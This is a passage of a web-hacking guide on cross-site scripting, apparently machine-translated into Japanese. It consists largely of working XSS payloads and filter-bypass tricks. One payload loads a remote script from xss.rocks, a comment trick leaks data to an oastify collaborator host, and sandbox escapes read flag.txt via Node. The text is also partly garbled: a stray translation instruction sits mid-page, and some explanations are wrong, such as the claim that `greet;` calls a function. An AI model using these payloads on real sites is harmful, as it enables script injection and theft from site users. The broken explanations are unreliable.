<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">
```
### UnicodeエンコードによるJS実行

This technique allows an attacker to execute JavaScript code by using Unicode encoding to bypass input validation and filtering mechanisms.

このテクニックは、入力の検証やフィルタリングメカニズムをバイパスするためにUnicodeエンコーディングを使用してJavaScriptコードを実行する攻撃者によって使用されます。

#### Summary

概要

- Unicode encoding is a way to represent characters in a computer system using Unicode standards.
- Unicodeエンコーディングは、Unicode規格を使用してコンピュータシステム内の文字を表現する方法です。
- By encoding JavaScript code using Unicode characters, it is possible to bypass input filters that only look for specific keywords or patterns.
- Unicode文字を使用してJavaScriptコードをエンコードすることで、特定のキーワードやパターンのみを検索する入力フィルタをバイパスすることができます。
- This technique can be used to execute arbitrary JavaScript code, including stealing sensitive information, performing actions on behalf of the user, or defacing the website.
- このテクニックは、機密情報の盗難、ユーザーの代わりにアクションを実行する、またはウェブサイトの改ざんなど、任意のJavaScriptコードを実行するために使用することができます。

#### Steps

手順

1. Identify the input field or parameter where the JavaScript code will be injected.
1. JavaScriptコードが挿入される入力フィールドまたはパラメータを特定します。
2. Encode the JavaScript code using Unicode characters. For example, the string `alert('XSS')` can be encoded as `\u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053')`.
2. Unicode文字を使用してJavaScriptコードをエンコードします。例えば、文字列`alert('XSS')`は`\u0061\u006c\u0065\u0072\u0074('\u0058\u0053\u0053')`としてエンコードされます。
3. Inject the encoded JavaScript code into the vulnerable input field or parameter.
3. エンコードされたJavaScriptコードを脆弱な入力フィールドまたはパラメータに挿入します。
4. When the application processes the input, the encoded JavaScript code will be decoded and executed as regular JavaScript code.
4. アプリケーションが入力を処理すると、エンコードされたJavaScriptコードがデコードされ、通常のJavaScriptコードとして実行されます。
5. The JavaScript code will execute in the context of the user's browser, allowing the attacker to perform various actions.
5. JavaScriptコードは、ユーザーのブラウザのコンテキストで実行されるため、攻撃者はさまざまなアクションを実行することができます。

#### Example

例

Consider the following vulnerable code snippet:

以下の脆弱なコードスニペットを考えてみましょう。

```html
<input type="text" name="search" value="">
<button onclick="search()">Search</button>

<script>
function search() {
  var query = document.getElementsByName("search")[0].value;
  // Process the query...
}
</script>
```

An attacker can inject malicious JavaScript code using Unicode encoding:

攻撃者は、Unicodeエンコーディングを使用して悪意のあるJavaScriptコードを挿入することができます。

```html
<input type="text" name="search" value="\u003cscript\u003ealert('\u0058\u0053\u0053')\u003c/script\u003e">
<button onclick="search()">Search</button>

<script>
function search() {
  var query = document.getElementsByName("search")[0].value;
  // Process the query...
}
</script>
```

When the user clicks the "Search" button, the injected JavaScript code will be executed, resulting in an alert box displaying "XSS".

ユーザーが「検索」ボタンをクリックすると、挿入されたJavaScriptコードが実行され、"XSS"と表示されるアラートボックスが表示されます。

#### Prevention

予防策

To prevent Unicode encode JS execution attacks, it is recommended to:

UnicodeエンコードによるJS実行攻撃を防ぐためには、以下の対策を推奨します。

- Implement proper input validation and filtering mechanisms to prevent the execution of arbitrary JavaScript code.
- 任意のJavaScriptコードの実行を防ぐために、適切な入力の検証とフィルタリングメカニズムを実装します。
- Use a content security policy (CSP) to restrict the types of content that can be executed on a website.
- ウェブサイトで実行できるコンテンツの種類を制限するために、コンテンツセキュリティポリシー（CSP）を使用します。
- Encode user input properly before processing it to prevent the interpretation of special characters.
- 特殊文字の解釈を防ぐために、ユーザーの入力を適切にエンコードしてから処理します。
- Regularly update and patch web application frameworks and libraries to fix any known vulnerabilities.
- 既知の脆弱性を修正するために、定期的にウェブアプリケーションのフレームワークとライブラリを更新およびパッチします。

#### References

参考文献

- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS (クロスサイトスクリプティング) 予防チートシート](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
```javascript
\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)
```
### JavaScriptのブラックリスト回避テクニック

**文字列**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊なエスケープ**

In some cases, the traditional HTML entities may not work to escape characters in XSS attacks. In such situations, special escapes can be used to bypass filters and inject malicious code. Here are some commonly used special escapes:

以下の場合、従来のHTMLエンティティではXSS攻撃での文字のエスケープがうまくいかないことがあります。そのような状況では、特殊なエスケープを使用してフィルタをバイパスし、悪意のあるコードを挿入することができます。以下はよく使用される特殊なエスケープの例です。

- **Double URL encoding**: This involves encoding the special characters twice using URL encoding. For example, the `<` character can be encoded as `%253C`. This can help bypass filters that only decode URL-encoded characters once.

  - **ダブルURLエンコーディング**: これは、特殊文字をURLエンコーディングを使用して2回エンコードすることを意味します。例えば、`<`文字は`%253C`とエンコードされます。これにより、URLエンコードされた文字を1回だけデコードするフィルタをバイパスするのに役立ちます。

- **JavaScript Unicode encoding**: This involves encoding the special characters using JavaScript Unicode encoding. For example, the `<` character can be encoded as `\u003C`. This can help bypass filters that only decode HTML entities.

  - **JavaScript Unicodeエンコーディング**: これは、特殊文字をJavaScript Unicodeエンコーディングを使用してエンコードすることを意味します。例えば、`<`文字は`\u003C`とエンコードされます。これにより、HTMLエンティティのみをデコードするフィルタをバイパスするのに役立ちます。

- **CSS Unicode encoding**: This involves encoding the special characters using CSS Unicode encoding. For example, the `<` character can be encoded as `\3C`. This can help bypass filters that only decode HTML entities and JavaScript Unicode encoding.

  - **CSS Unicodeエンコーディング**: これは、特殊文字をCSS Unicodeエンコーディングを使用してエンコードすることを意味します。例えば、`<`文字は`\3C`とエンコードされます。これにより、HTMLエンティティとJavaScript Unicodeエンコーディングのみをデコードするフィルタをバイパスするのに役立ちます。

Remember to test these special escapes thoroughly to ensure they work as expected in your specific scenario.
```javascript
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself
```
**JSコード内のスペースの置換**

スペースは、JavaScriptコード内でのスペースの置換に使用される特殊な文字です。スペースの置換は、クロスサイトスクリプティング（XSS）攻撃の一部として使用されることがあります。

スペースの置換は、攻撃者がスペースを他の文字に置き換えることで、悪意のあるスクリプトを実行するための制約を回避する方法です。攻撃者は、スペースを置換することで、フィルタリングやサニタイズのメカニズムを回避し、悪意のあるコードを実行することができます。

スペースの置換は、さまざまな方法で行うことができます。一般的な方法には、スペースをUnicodeエスケープシーケンス（\u0020）やHTMLエンティティ（&#32;）に置き換える方法があります。これにより、スペースが無害な文字列として扱われ、攻撃者がスクリプトを実行するための制約を回避することができます。

スペースの置換は、XSS攻撃の一環として使用されるため、開発者は入力データの検証とサニタイズを適切に行うことが重要です。また、セキュリティ意識の高いコーディングプラクティスを採用することも重要です。
```javascript
<TAB>
/**/
```
**JavaScriptのコメント（**[**JavaScript Comments**](./#javascript-comments) **トリックから）**

JavaScriptのコメントは、コード内の特定の行やブロックを無効化するために使用されます。これは、コードのデバッグやドキュメント化に役立ちます。

```javascript
// これはシングルラインコメントです

/*
これは
マルチライン
コメントです
*/
```

コメントは、スクリプトの実行時に無視されるため、攻撃者が悪意のあるコードを挿入するのに使用することができます。これは、クロスサイトスクリプティング（XSS）攻撃の一部として悪用されることがあります。

XSS攻撃では、攻撃者はウェブアプリケーションに悪意のあるスクリプトを挿入し、ユーザーのブラウザで実行させます。これにより、攻撃者はユーザーのセッション情報を盗み、不正な操作を行うことができます。

以下は、XSS攻撃の例です。

```html
<script>
  var userInput = "<script>alert('XSS');</script>";
  document.write(userInput);
</script>
```

この例では、攻撃者は`<script>alert('XSS');</script>`というスクリプトをユーザーの入力として送信します。ウェブアプリケーションはこの入力を信頼して実行し、ユーザーのブラウザでXSSスクリプトが実行されます。

XSS攻撃を防ぐためには、入力検証とエスケープ処理を行う必要があります。入力検証は、受け入れるべき入力の形式や文字制限を定義することです。エスケープ処理は、特殊文字を無害な文字に変換することです。

例えば、HTMLエスケープを行うと、`<`は`&lt;`に、`>`は`&gt;`に変換されます。これにより、攻撃者がHTMLタグを挿入しても、タグとして解釈されずに表示されます。

```html
<script>
  var userInput = "&lt;script&gt;alert('XSS');&lt;/script&gt;";
  document.write(userInput);
</script>
```

このように、適切な入力検証とエスケープ処理を行うことで、XSS攻撃を防ぐことができます。
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScriptの改行（**[**JavaScriptの改行**](./#javascript-new-lines) **トリックから）**

JavaScriptでは、改行は通常、コードの可読性を向上させるために使用されます。しかし、改行はXSS攻撃のためにも利用されることがあります。

XSS攻撃では、悪意のあるスクリプトがWebページに挿入され、ユーザーのブラウザで実行されます。改行は、スクリプトの可読性を向上させるために使用されるため、攻撃者は改行を利用してスクリプトを隠すことができます。

以下は、改行を使用したXSS攻撃の例です。

```html
<script>
  alert('XSS attack');
</script>
```

このスクリプトは、改行を使用しているため、攻撃者がスクリプトを隠すことができます。

対策としては、入力データのエスケープやサニタイズを行うことが重要です。また、入力データを信頼できるソースからのみ受け入れるようにすることも重要です。
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9
```
**JavaScriptの空白文字**

JavaScriptでは、空白文字は通常、コードの可読性を向上させるために使用されます。しかし、XSS（クロスサイトスクリプティング）攻撃の文脈では、空白文字は攻撃者にとって非常に有用なツールとなります。

攻撃者は、空白文字を使用してXSSペイロードを隠すことができます。これにより、攻撃者は検出や回避を困難にすることができます。

以下に、いくつかの一般的なJavaScript空白文字の例を示します。

- スペース（` `）
- タブ（`\t`）
- 改行（`\n`）
- キャリッジリターン（`\r`）
- 垂直タブ（`\v`）
- フォームフィード（`\f`）

攻撃者は、これらの空白文字を使用して、XSSペイロードを分割したり、スペースで埋めたりすることができます。これにより、攻撃者は検出を回避し、攻撃を成功させることができます。

XSS攻撃を防ぐためには、入力検証とエスケープ処理を適切に行うことが重要です。また、ユーザーからの入力を信頼せず、常にセキュリティ対策を行うことが必要です。
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**コメント内のJavascript**

Sometimes, web developers may include comments in their code to provide explanations or notes. However, it is important to be aware that comments can also be used as a potential attack vector for Cross-Site Scripting (XSS) vulnerabilities.

In some cases, if a comment is not properly sanitized or filtered, an attacker can inject malicious JavaScript code within the comment. This can lead to the execution of the injected code when the comment is rendered on the web page.

To prevent this type of attack, it is crucial for developers to properly sanitize and validate all user-generated content, including comments. Additionally, implementing a Content Security Policy (CSP) can help mitigate the risk of XSS attacks by restricting the execution of JavaScript code from untrusted sources.

Remember, as a pentester, it is important to identify and report any potential XSS vulnerabilities, including those that may be hidden within comments.
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**括弧なしのJavaScript**

JavaScriptでは、関数を呼び出す際に通常は括弧を使用します。しかし、括弧を使用せずに関数を呼び出す方法もあります。これは、関数が引数を受け取らない場合に特に便利です。

例えば、以下のような関数があるとします。

```javascript
function greet() {
  console.log("Hello, world!");
}
```

通常の呼び出しでは、関数名の後に括弧を付けます。

```javascript
greet();
```

しかし、括弧を省略しても同じ結果を得ることができます。

```javascript
greet;
```

このように、関数名のみを記述することで、関数を呼び出すことができます。ただし、この方法は引数を伴う関数には適用できません。
````javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
// Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
// These operations are called when the object is used as a primitive
// Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
// Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337");
// Error handler + Comma separator
// The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
// optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
// The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.
````
* [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
* [https://portswigger.net/research/javascript-without-parentheses-using-dommatrix](https://portswigger.net/research/javascript-without-parentheses-using-dommatrix)

**任意の関数（alert）の呼び出し**
````javascript
//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie'])
with(document)alert(cookie)
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>
````
## **DOMの脆弱性**

攻撃者が制御する**安全でないデータ**（例：`location.href`）を使用している**JSコード**があります。攻撃者はこれを悪意のあるJSコードを実行するために悪用することができます。\
**DOMの脆弱性の説明が長くなったため、[このページに移動しました](dom-xss.md)**:**

{% content-ref url="dom-xss.md" %}
[dom-xss.md](dom-xss.md)
{% endcontent-ref %}

そこでは、DOMの脆弱性が何であり、どのように引き起こされ、どのように悪用されるかについての詳細な説明が見つかります。\
また、[**DOM Clobbering攻撃についての説明**](dom-xss.md#dom-clobbering)も、**前述の投稿の最後に見つけることができます**。

## その他のバイパス方法

### 正規化されたUnicode

サーバー（またはクライアント側）で**反映された値**が**Unicode正規化**されているかどうかを確認し、この機能を悪用して保護をバイパスすることができます。[**ここに例があります**](../unicode-injection/#xss-cross-site-scripting)。

### PHP FILTER\_VALIDATE\_EMAILフラグのバイパス
```javascript
"><svg/onload=confirm(1)>"@x.y
```
### Ruby-On-Rails バイパス

**RoRのマスアサインメント**により、引用符がHTMLに挿入され、引用符の制限がバイパスされ、タグ内に追加のフィールド（onfocus）が追加されます。\
例えば、以下のレポート（[こちらのレポート](https://hackerone.com/reports/709336)から）からのフォームの例を見てみましょう。もし、以下のペイロードを送信すると：
```
contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa
```
以下のように、"Key"と"Value"のペアはエコーバックされます:

```html
<p>Key: Value</p>
```

この場合、攻撃者は"Key"と"Value"の値を制御できるため、悪意のあるスクリプトを挿入することができます。これにより、クロスサイトスクリプティング（XSS）攻撃が可能になります。
```
{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}
```
次に、onfocus属性が挿入されます：

![](<../../.gitbook/assets/image (107).png>)

XSSが発生します。

### 特殊な組み合わせ
```markup
<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
```
### 302レスポンスでのヘッダーインジェクションによるXSS

もし、**302リダイレクトレスポンスでヘッダーをインジェクション**できることがわかった場合、**ブラウザが任意のJavaScriptを実行する**ことを試してみることができます。これは**簡単なことではありません**。なぜなら、モダンなブラウザはHTTPレスポンスのステータスコードが302の場合、HTTPレスポンスボディを解釈しないため、単なるクロスサイトスクリプティングのペイロードは無意味だからです。

[**このレポート**](https://www.gremwell.com/firefox-xss-302)と[**このレポート**](https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/)では、Locationヘッダー内でいくつかのプロトコルをテストし、ブラウザがボディ内のXSSペイロードを検査および実行できるかどうかを確認する方法について読むことができます。\
過去に知られているプロトコル: `mailto://`, `//x:1/`, `ws://`, `wss://`, _空のLocationヘッダー_, `resource://`.

### 文字、数字、ドットのみ

もし、**コールバック**が指定されている場合、JavaScriptが実行されることがわかっている文字に制限されます。[**この投稿のこのセクション**](./#javascript-function)を読んで、この動作を悪用する方法を見つけてください。

### XSSに対応する有効な`<script>`コンテンツタイプ

([**ここから**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)引用) もし、`application/octet-stream`などの**コンテンツタイプ**を持つスクリプトをロードしようとすると、Chromeは以下のエラーを表示します:

> Refused to execute script from ‘[https://uploader.c.hc.lc/uploads/xxx'](https://uploader.c.hc.lc/uploads/xxx') because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

Chromeが**ロードされたスクリプト**を実行するのにサポートする**Content-Type**は、[https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third\_party/blink/common/mime\_util/mime\_util.cc)のconst **`kSupportedJavascriptTypes`**内にあるものだけです。
```c
const char* const kSupportedJavascriptTypes[] = {
"application/ecmascript",
"application/javascript",
"application/x-ecmascript",
"application/x-javascript",
"text/ecmascript",
"text/javascript",
"text/javascript1.0",
"text/javascript1.1",
"text/javascript1.2",
"text/javascript1.3",
"text/javascript1.4",
"text/javascript1.5",
"text/jscript",
"text/livescript",
"text/x-ecmascript",
"text/x-javascript",
};

```
### XSSに使用されるスクリプトの種類

([**こちら**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)から) では、どのような種類のスクリプトがスクリプトの読み込みを示すことができるのでしょうか？
```html
<script type="???"></script>
```
以下は、ハッキング技術に関する本の内容です。以下の内容は、ファイル/hive/hacktricks/pentesting-web/xss-cross-site-scripting/README.mdからのものです。関連する英語のテキストを日本語に翻訳し、翻訳を保持して正確に同じマークダウンとHTMLの構文を返してください。コード、ハッキング技術の名前、ハッキングの言葉、クラウド/SaaSプラットフォームの名前（Workspace、aws、gcpなど）、'leak'という単語、ペンテスト、およびマークダウンタグなどは翻訳しないでください。また、翻訳とマークダウンの構文以外の追加のものは追加しないでください。

* **module**（デフォルト、説明することはありません）
* \*\*\*\*[**webbundle**](https://web.dev/web-bundles/)：Web Bundlesは、複数のデータ（HTML、CSS、JSなど）を**`.wbn`**ファイルにまとめることができる機能です。
```html
<script type="webbundle">
{
"source": "https://example.com/dir/subresources.wbn",
"resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP
```
* \*\*\*\*[**importmap**](https://github.com/WICG/import-maps)**:** インポート構文を改善することができます。
```html
<script type="importmap">
{
"imports": {
"moment": "/node_modules/moment/src/moment.js",
"lodash": "/node_modules/lodash-es/lodash.js"
}
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>
```
この動作は、[**この解説記事**](https://github.com/zwade/yaca/tree/master/solution)で使用され、ライブラリをevalにリマップして悪用し、XSSをトリガーするために使用されました。

* \*\*\*\*[**speculationrules**](https://github.com/WICG/nav-speculation)**:** この機能は、主にプリレンダリングによって引き起こされるいくつかの問題を解決するために使用されます。以下のように機能します：
```html
<script type="speculationrules">
{
"prerender": [
{"source": "list",
"urls": ["/page/2"],
"score": 0.5},
{"source": "document",
"if_href_matches": ["https://*.wikipedia.org/**"],
"if_not_selector_matches": [".restricted-section *"],
"score": 0.1}
]
}
</script>
```
### XSSに使用するWebコンテンツタイプ

([**こちら**](https://blog.huli.tw/2022/04/24/en/how-much-do-you-know-about-script-type/)から) 以下のコンテンツタイプは、すべてのブラウザでXSSを実行することができます：

* text/html
* application/xhtml+xml
* application/xml
* text/xml
* image/svg+xml
* text/plain (?? リストにはありませんが、CTFで見たことがあると思います)
* application/rss+xml (オフ)
* application/atom+xml (オフ)

他のブラウザでは、他の**`Content-Types`**を使用して任意のJSを実行することができます。詳細はこちらを参照してください：[https://github.com/BlackFan/content-type-research/blob/master/XSS.md](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)

### xmlコンテンツタイプ

ページがtext/xmlコンテンツタイプを返す場合、名前空間を指定して任意のJSを実行することができます：
```xml
<xml>
<text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml" /></text>
</xml>

<!-- Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker (p. 113). Kindle Edition. -->
```
### 特別な置換パターン

**`"some {{template}} data".replace("{{template}}", <user_input>)`** のようなものが使用される場合、攻撃者は[**特別な文字列の置換**](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/String/replace#specifying\_a\_string\_as\_the\_replacement)を使用して、いくつかの保護をバイパスしようとすることができます：``"123 {{template}} 456".replace("{{template}}", JSON.stringify({"name": "$'$`alert(1)//"}))``

たとえば、[**この解説**](https://gitea.nitowa.xyz/nitowa/PlaidCTF-YACA)では、これを使用してスクリプト内のJSON文字列をエスケープし、任意のコードを実行しました。

### ChromeキャッシュからXSSへ

### XS Jails

使用できる文字のセットが制限されている場合、XSJailの問題に対する他の有効な解決策を確認してください。
```javascript
// eval + unescape + regex
eval(unescape(/%2f%0athis%2econstructor%2econstructor(%22return(process%2emainModule%2erequire(%27fs%27)%2ereadFileSync(%27flag%2etxt%27,%27utf8%27))%22)%2f/))()
eval(unescape(1+/1,this%2evalueOf%2econstructor(%22process%2emainModule%2erequire(%27repl%27)%2estart()%22)()%2f/))

// use of with
with(console)log(123)
with(/console.log(1)/)with(this)with(constructor)constructor(source)()
// Just replace console.log(1) to the real code, the code we want to run is:
//return String(process.mainModule.require('fs').readFileSync('flag.txt'))

with(process)with(mainModule)with(require('fs'))return(String(readFileSync('flag.txt')))
with(k='fs',n='flag.txt',process)with(mainModule)with(require(k))return(String(readFileSync(n)))
with(String)with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)with(mainModule)with(require(k))return(String(readFileSync(n)))

//Final solution
with(
/with(String)
with(f=fromCharCode,k=f(102,115),n=f(102,108,97,103,46,116,120,116),process)
with(mainModule)
with(require(k))
return(String(readFileSync(n)))
/)
with(this)
with(constructor)
constructor(source)()

// For more uses of with go to challenge misc/CaaSio PSE in
// https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#misc/CaaSio%20PSE
```
### Obfuscation & Advanced Bypass

* **同一ページ内での異なる難読化:** [**https://aem1k.com/aurebesh.js/**](https://aem1k.com/aurebesh.js/)
* [https://github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js)
* [https://ooze.ninja/javascript/poisonjs](https://ooze.ninja/javascript/poisonjs)
* [https://javascriptobfuscator.herokuapp.com/](https://javascriptobfuscator.herokuapp.com)
* [https://skalman.github.io/UglifyJS-online/](https://skalman.github.io/UglifyJS-online/)
* [http://www.jsfuck.com/](http://www.jsfuck.com)
* より高度なJSFuck: [https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce](https://medium.com/@Master\_SEC/bypass-uppercase-filters-like-a-pro-xss-advanced-methods-daf7a82673ce)
* [http://utf-8.jp/public/jjencode.html](http://utf-8.jp/public/jjencode.html)
* [https://utf-8.jp/public/aaencode.html](https://utf-8.jp/public/aaencode.html)
* [https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses](https://portswigger.net/research/the-seventh-way-to-call-a-javascript-function-without-parentheses)
```javascript
//Katana
<script>([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()</script>
```

```javascript
//JJencode
